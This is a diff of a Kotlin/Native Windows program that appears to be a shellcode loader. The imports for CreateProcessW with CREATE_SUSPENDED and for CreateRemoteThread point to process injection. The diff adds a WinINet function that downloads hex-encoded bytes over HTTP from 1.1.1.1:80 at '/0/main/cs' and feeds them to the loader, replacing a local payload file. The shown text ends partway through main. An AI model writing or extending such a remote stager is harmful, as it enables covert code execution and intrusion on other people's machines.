@@ -14,6 +14,7 @@ import kotlinx.cinterop.toCValues
 import kotlinx.cinterop.toKString
 import kotlinx.cinterop.value
 import kotlinx.cinterop.wcstr
+import platform.posix.BUFSIZ
 import platform.posix.P_OVERLAY
 import platform.posix.SEEK_END
 import platform.posix.fclose
@@ -28,6 +29,13 @@ import platform.windows.CREATE_SUSPENDED
 import platform.windows.CreateProcessW
 import platform.windows.CreateRemoteThread
 import platform.windows.GetModuleFileNameW
+import platform.windows.HttpOpenRequestW
+import platform.windows.HttpSendRequestW
+import platform.windows.INTERNET_FLAG_RELOAD
+import platform.windows.INTERNET_SERVICE_HTTP
+import platform.windows.InternetConnectW
+import platform.windows.InternetOpenW
+import platform.windows.InternetReadFile
 import platform.windows.LPTHREAD_START_ROUTINE
 import platform.windows.MAX_PATH
 import platform.windows.MEM_COMMIT
@@ -59,9 +67,28 @@ fun readFile(fileName: String): ByteArray? {
     }
 }
 
+fun downloadFile(host: String, port: Int, path: String): ByteArray? = runCatching {
+    val hSession = InternetOpenW(null, 0.convert(), null, null, 0.convert())
+    val hConnect = InternetConnectW(hSession, host, port.convert(), null, null, INTERNET_SERVICE_HTTP, 0.convert(), 0.convert())
+    val hRequest = HttpOpenRequestW(hConnect, "GET", path, null, null, null, INTERNET_FLAG_RELOAD, 0.convert())
+    HttpSendRequestW(hRequest, null, 0.convert(), null, 0.convert())
+
+    val list = arrayListOf<Byte>()
+    memScoped {
+        val size = alloc<UIntVar>()
+        val buf = allocArray<ByteVar>(BUFSIZ)
+        while (true) {
+            InternetReadFile(hRequest, buf, BUFSIZ, size.ptr)
+            if (size.value.toInt() == 0) break
+            list.addAll(buf.readBytes(size.value.toInt()).asList())
+        }
+    }
+    return list.toByteArray()
+}.getOrNull()
+
 fun main() {
     memScoped {
-        val raw = readFile("""payload.txt""")?.decodeToString()?.hex2byte() ?: exitProcess(0)
+        val raw = downloadFile("1.1.1.1", 80, "/0/main/cs")?.decodeToString()?.trim()?.hex2byte() ?: exitProcess(0)
         val rawSize = raw.size
 
         val si = alloc<STARTUPINFO>()
